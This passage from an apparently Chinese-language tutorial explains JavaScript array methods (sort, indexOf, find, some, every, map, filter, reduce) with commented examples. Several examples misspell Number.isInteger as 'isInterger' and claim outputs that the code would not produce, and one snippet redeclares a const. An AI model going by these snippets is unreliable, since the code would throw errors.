arr<span class="token punctuation">.</span><span class="token function">sort</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">a<span class="token punctuation">,</span> b</span><span class="token punctuation">)</span> <span class="token operator">=></span> a <span class="token operator">-</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 正数、负数、0为排序函数返回值，排序方法返回arr为[ 4, 5, 6, 7, 10, 12, 17, 33, 54, 82, 88 ]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>排序方法返回排序后的原数组，原数组被改变。</p>
<h1 id="数组查找"><a href="#数组查找" class="headerlink" title="数组查找"></a>数组查找</h1><ol>
<li><p>arr.indexOf(element[, start])</p>
<p> 该方法在数组中查找给定的元素element，并返回匹配的第一个元素索引，若不存在则返回-1。start是开始查找的位置索引，默认开始查找位置是0。</p>
</li>
<li><p>arr.lastIndexOf(element[, start])</p>
<p> 该方法从后向前查找给定的元素element，并返回匹配的第一个元素索引，若不存在则返回-1。start是开始查找的位置索引，默认开始查找位置是arr.length-1。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> o <span class="token operator">=</span> <span class="token punctuation">&#123;</span>name<span class="token operator">:</span> <span class="token string">"Jerry"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">,</span> o<span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string">"9"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回1</span>
arr<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回5</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回2</span>
arr<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回2</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>name<span class="token operator">:</span> <span class="token string">"Jerry"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回-1，对象为引用型，这里的对象与o内容相同，引用自不同内存位置</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回3</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回-1，数组为引用型，这里的数组与arr中[1, 2]内容相同，但引用自不同内存位置</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"9"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回7</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回-1</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token string">"a"</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回-1</span>
arr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回5</span>
arr<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回1</span>
arr<span class="token punctuation">.</span><span class="token function">lastIndexOf</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回-1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>
<li><p>arr.findIndex(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p> 该方法返回数组中符合测试函数的第一个元素的索引，无符合元素返回-1。</p>
</li>
<li><p>arr.find(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p> 该方法返回数组中符合测试函数的第一个元素，无符合元素返回undefined。</p>
</li>
<li><p>arr.some(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p> 若数组中有一个符合该方法测试函数的元素，则返回true，否则返回false。</p>
</li>
<li><p>arr.every(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p> 若数组中所有元素符合该方法测试函数的元素，则返回true，否则返回false。注：空数组也会返回true，因为空数组没有元素，也没有返回任何一个false。</p>
</li>
</ol>
<p>回调函数第一个参数element传入当前元素，第二个元素index传入当前元素的索引，第三个参数array传入调用该方法的数组。thisArg参数可选，可指定this对象的值，省略时，非严格模式默认为window，严格模式默认为undefined。</p>
<p>find与findIndex方法下，数组中从索引0到索引length-1都会执行回调函数，而不仅仅是被赋值的索引，所以在稀疏数组中，那些不存在值的索引也会被调用回调函数，故这两个方法效率低于只遍历有值元素索引的方法。</p>
<p>some与every方法下，只在已经赋值的索引元素上调用回调函数，而未被赋值或被删除的索引的元素上不调用回调函数，故效率高于遍历所有元素索引的方法</p>
<p>第一次调用callback函数时会确定元素的索引范围，因此在这四个方法开始调用后，添加到数组的新元素不会被访问到。被删除的元素仍然会被find和findIndex方法访问到，但不会被some和every方法访问到。如果数组中一个尚未被callback函数访问到的元素被callback函数所改变，那么当callback函数访问到它时，它的值是根据它在数组中的索引访问到的当前值，即改变后的值。</p>
<p>这四个方法本身不改变原数组，除非回调函数中的代码改变了原数组。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 查找数组中被删除的数，若是单数，则删除单数后的第二个数</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> result <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">findIndex</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">element<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>element <span class="token operator">===</span> <span class="token keyword">undefined</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>element <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">!==</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">delete</span> arr<span class="token punctuation">[</span>index <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>result<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2 元素虽被删除但仍然能够访问到，访问到的是当前值</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>arr<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [1, 3, undefined, undefined, 7, 9]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 查找索引大于2，且平方根是整数的元素</span>
<span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">find</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">x<span class="token punctuation">,</span> i</span><span class="token punctuation">)</span> <span class="token operator">=></span> i <span class="token operator">></span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> Number<span class="token punctuation">.</span><span class="token function">isInterger</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 返回值为4</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">15</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true; 12是偶数</span>
arr<span class="token punctuation">.</span><span class="token function">some</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> Number<span class="token punctuation">.</span><span class="token function">isInterger</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false; 没有平方数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> <span class="token number">36</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
arr<span class="token punctuation">.</span><span class="token function">every</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> x <span class="token operator">%</span> <span class="token number">2</span> <span class="token operator">===</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// true; 没有奇数</span>
arr<span class="token punctuation">.</span><span class="token function">every</span><span class="token punctuation">(</span><span class="token parameter">x</span> <span class="token operator">=></span> Number<span class="token punctuation">.</span><span class="token function">isInterger</span><span class="token punctuation">(</span>Math<span class="token punctuation">.</span><span class="token function">sqrt</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// false; 6不是平方数</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<h1 id="数组遍历"><a href="#数组遍历" class="headerlink" title="数组遍历"></a>数组遍历</h1><h2 id="map方法"><a href="#map方法" class="headerlink" title="map方法"></a>map方法</h2><p>arr.map(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p>map方法返回一个新数组，新数组中元素是原数组中元素调用回调函数后返回的结果，该方法不改变原数组。</p>
<p>回调函数第一个参数element传入当前元素，第二个元素index传入当前元素的索引，第三个参数array传入调用该方法的数组。thisArg参数可选，可指定this对象的值，省略时，非严格模式默认为window，严格模式默认为undefined。</p>
<p>map方法只在已赋值的元素上调用回调函数，而不在从未赋值或已经被删除的元素上调用回调函数。</p>
<p>map方法中，第一次调用callback函数时就已经确定了元素的索引范围，map方法调用后，新添加到数组的元素不会被访问到；尚未被callback函数访问到的元素被callback函数所改变，被callback函数访问到时，访问到的值为被改变后的当前值；从未被赋值的元素或已经被前面callback函数删除的元素不会被访问到。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> kvArray <span class="token operator">=</span> <span class="token punctuation">[</span>
    <span class="token punctuation">&#123;</span>key<span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span> value<span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>key<span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span> value<span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token punctuation">&#123;</span>key<span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span> value<span class="token operator">:</span> <span class="token number">30</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> reformattedArray <span class="token operator">=</span> kvArray<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">obj</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">const</span> rObj <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
    rObj<span class="token punctuation">[</span>obj<span class="token punctuation">.</span>key<span class="token punctuation">]</span> <span class="token operator">=</span> obj<span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">return</span> rObj<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// reformattedArray [&#123;1: 10&#125;, &#123;2: 20&#125;, &#123;3: 30&#125;]</span>
<span class="token comment">// kvArray [&#123;key: 1, value: 10&#125;, &#123;key: 2, value: 20&#125;, &#123;key: 3, value: 30&#125;]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="filter方法"><a href="#filter方法" class="headerlink" title="filter方法"></a>filter方法</h2><p>arr.filter(function callback (element[, index[, array]]) { }[, thisArg])</p>
<p>filter方法返回一个新数组，筛选出原数组中符合回调函数条件的所有元素放入新数组。该方法不改变原数组。</p>
<p>回调函数第一个参数element传入当前元素，第二个元素index传入当前元素的索引，第三个参数array传入调用该方法的数组。thisArg参数可选，可指定this对象的值，省略时，非严格模式默认为window，严格模式默认为undefined。</p>
<p>filter方法只在已赋值的元素上调用回调函数，而不在从未赋值或已经被删除的元素上调用回调函数。</p>
<p>filter方法中，第一次调用callback函数时就已经确定了元素的索引范围，filter方法调用后，新添加到数组的元素不会被访问到；尚未被callback函数访问到的元素被callback函数所改变，被callback函数访问到时，访问到的值为被改变后的当前值；从未被赋值的元素或已经被前面callback函数删除的元素不会被访问到。</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">130</span><span class="token punctuation">,</span> <span class="token number">44</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> filteredArr <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">element</span> <span class="token operator">=></span> element <span class="token operator">>=</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [12, 130, 44]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">// 创建一副牌，并按一定的条件筛选牌</span>
<span class="token comment">// 创建牌</span>
<span class="token keyword">const</span> cards <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> suit <span class="token keyword">of</span> <span class="token punctuation">[</span><span class="token string">"H"</span><span class="token punctuation">,</span> <span class="token string">"C"</span><span class="token punctuation">,</span> <span class="token string">"D"</span><span class="token punctuation">,</span> <span class="token string">"S"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">let</span> value <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> value <span class="token operator">&lt;=</span> <span class="token number">13</span><span class="token punctuation">;</span> value<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        cards<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>suit<span class="token punctuation">,</span> value<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cards<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [&#123;suit: "H", value: 1&#125;, &#123;suit: "H", value: 2&#125;, ...&#123;suit: "S", value: 13&#125;]</span>
<span class="token keyword">const</span> suits <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">"H"</span><span class="token operator">:</span> <span class="token string">"\u2665"</span><span class="token punctuation">,</span> <span class="token string">"C"</span><span class="token operator">:</span> <span class="token string">"\u2663"</span><span class="token punctuation">,</span> <span class="token string">"D"</span><span class="token operator">:</span> <span class="token string">"\u2666"</span><span class="token punctuation">,</span> <span class="token string">"S"</span><span class="token operator">:</span> <span class="token string">"\u2660"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 花色图案字符串</span>
<span class="token keyword">const</span> values <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">1</span><span class="token operator">:</span> <span class="token string">"A"</span><span class="token punctuation">,</span> <span class="token number">11</span><span class="token operator">:</span> <span class="token string">"J"</span><span class="token punctuation">,</span> <span class="token number">12</span><span class="token operator">:</span> <span class="token string">"Q"</span><span class="token punctuation">,</span> <span class="token number">13</span><span class="token operator">:</span> <span class="token string">"K"</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span> <span class="token comment">// 牌面大小字符串</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> i <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">11</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    values<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// &#123;1: "A", 2: "2", 3: "3", ...13: "K"&#125;</span>
<span class="token keyword">function</span> <span class="token function">stringCards</span><span class="token punctuation">(</span><span class="token parameter">card</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token comment">// 将牌输出成图案字符串</span>
    <span class="token keyword">return</span> suits<span class="token punctuation">[</span>card<span class="token punctuation">.</span>suit<span class="token punctuation">]</span> <span class="token operator">+</span> values<span class="token punctuation">[</span>card<span class="token punctuation">.</span>value<span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">const</span> cardsFilter1 <span class="token operator">=</span> cards<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">card</span> <span class="token operator">=></span> card<span class="token punctuation">.</span>value <span class="token operator">===</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>stringCards<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 筛选值为2的牌，</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cardsFilter1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ["♥2", "♣2", "♦2", "♠2"]</span>
<span class="token keyword">const</span> cardsFilter2 <span class="token operator">=</span> cards<span class="token punctuation">.</span><span class="token function">filter</span><span class="token punctuation">(</span><span class="token parameter">card</span> <span class="token operator">=></span> card<span class="token punctuation">.</span>suit <span class="token operator">!==</span> <span class="token string">"D"</span> <span class="token operator">&amp;&amp;</span> card<span class="token punctuation">.</span>value <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span>stringCards<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 筛选不是方块且值小于等于4的牌</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>cardsFilter2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// ["♥A", "♥2", "♥3", "♥4", "♣A", "♣2", "♣3", "♣4", …]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="reduce方法"><a href="#reduce方法" class="headerlink" title="reduce方法"></a>reduce方法</h2><p>arr.reduce(function callback (accumulator, element[, index[, array]]) { }[, initialAccumulator])</p>
<p>reduce方法对累加器和数组中的每个元素（从左至右）执行回调函数，将其减少为单个值。</p>
<p>回调函数第一个参数accumulator是累加器累加后的返回值，它是上一次调用回调时返回的累加值，或累加器的初始值initialAccumulator。element是当前传入的元素值，index是当前传入元素的索引，array是调用reduce方法的数组本身。initialAccumulator是第一次调用回调函数的accumulator的初始值，若没有提供initialAccumulator的值，则使用数组第一个元素值。在没有初始值的空数组上调用reduce方法会报错。</p>
<p>reduce方法的返回值是回调函数累计处理后的返回值。</p>
<p>reduce方法依次为数组中每个元素执行回调函数，不包括数组中从未被赋值的元素和已经被删除的元素。回调函数第一次执行时accumulator与element有两种情况：1、调用reduce时提供了initialAccumulator，accumulator取值为initialAccumulator，element取值为数组的第一个元素；2、调用reduce时未提供initialAccumulator，accumulator取值为数组中第一个元素，element取值为数组的第二个元素。即未提供initialAccumulator，回调函数从索引为1的位置开始执行，提供initialAccumulator时，回调函数从索引0开始执行。</p>
<p>若数组为空且未提供initialAccumulator，则会抛出TypeError。若数组只有一个元素且未提供initialAccumulator，或数组为空但提供了initialAccumulator，那么唯一的值将被返回，回调函数并不会执行。</p>
<p>reduce最常见用法，数组元素求和</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> arr <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> sum <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">sum<span class="token punctuation">,</span> num</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> sum <span class="token operator">+=</span> num<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>sum<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 47</span>
<span class="token comment">// ES6 写法</span>
<span class="token keyword">const</span> sum <span class="token operator">=</span> arr<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">sum<span class="token punctuation">,</span> num</span><span class="token punctuation">)</span> <span class="token operator">=></span> sum <span class="token operator">+=</span> num<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">// 也可将返回值写为sum + num，结果与sum += num一样</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>二维数组转化为一维</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> flattened <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> element</span><span class="token punctuation">)</span> <span class="token operator">=></span> arr<span class="token punctuation">.</span><span class="token function">concat</span><span class="token punctuation">(</span>element<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>flattened<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// [0, 1, 2, 3, 4, 5]</span>
<span class="token comment">// 也可以用ES6解构赋值法</span>
<span class="token keyword">const</span> flattened <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">arr<span class="token punctuation">,</span> element</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">[</span><span class="token operator">...</span>arr<span class="token punctuation">,</span> <span class="token operator">...</span>element<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>计算数组中每个元素出现的次数</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> names <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"Alice"</span><span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token string">"Tiff"</span><span class="token punctuation">,</span> <span class="token string">"Bob"</span><span class="token punctuation">,</span> <span class="token string">"Bruce"</span><span class="token punctuation">,</span> <span class="token string">"Alice"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">const</span> countedNames <span class="token operator">=</span> names<span class="token punctuation">.</span><span class="token function">reduce</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token parameter">counted<span class="token punctuation">,</span> name</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
